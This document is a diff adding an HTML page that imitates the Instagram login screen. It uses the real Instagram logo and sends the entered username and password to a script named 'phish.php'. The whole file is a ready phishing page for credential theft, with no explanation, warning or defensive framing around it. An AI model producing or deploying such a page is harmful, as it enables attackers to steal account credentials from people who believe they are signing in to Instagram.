@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Instagram Login</title>
+<style>
+body {
+  font-family: sans-serif;
+  background-color: #fafafa;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+}
+
+.container {
+  background-color: #fff;
+  border: 1px solid #dbdbdb;
+  border-radius: 3px;
+  padding: 20px;
+  width: 350px;
+}
+
+.logo {
+  display: block;
+  margin: 0 auto 20px;
+  width: 175px;
+}
+
+input[type="text"],
+input[type="password"] {
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 10px;
+  border: 1px solid #dbdbdb;
+  border-radius: 3px;
+  box-sizing: border-box; /* Important to include padding and border in the element's total width and height */
+}
+
+input[type="submit"] {
+  background-color: #0095f6;
+  color: white;
+  padding: 10px;
+  border: none;
+  border-radius: 3px;
+  cursor: pointer;
+  width: 100%;
+}
+
+.forgot-password {
+  text-align: center;
+  margin-top: 10px;
+  font-size: 12px;
+  color: #999;
+}
+</style>
+</head>
+<body>
+  <div class="container">
+    <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/7c415066370d.png" alt="Instagram Logo">
+    <form action="phish.php" method="post">
+      <input type="text" name="username" placeholder="Phone number, username, or email">
+      <input type="password" name="password" placeholder="Password">
+      <input type="submit" value="Log In">
+    </form>
+    <div class="forgot-password">
+      <a href="#">Forgot password?</a>
+    </div>
+  </div>
+</body>
+</html>
